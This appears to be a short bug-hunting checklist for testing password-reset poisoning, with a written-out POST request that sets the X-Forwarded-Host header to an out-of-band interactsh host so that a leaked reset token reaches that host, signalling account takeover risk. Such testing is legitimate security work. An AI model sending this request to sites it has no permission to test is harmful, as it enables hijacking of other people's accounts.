**Step 1**

Click on Forgot Password

**Step 2**

Enter the email address of your account

**Step 3**

Add the `X-Forwarded-Host` header to the request with the `interactsh-client`.

```
POST /forgot-password HTTP/1.1 
Host: website.com
X-Forwarded-Host: cdshcndndhlqg0rrn9l0aqsxkbd9zgbmx.oast.site 

email=shelled@email.com
```

**Step 4**

Click on the reset link and if you receive a ping in your `interactsh-cleint` then the password reset token is being leaked and this is vulnerable to account takeover.
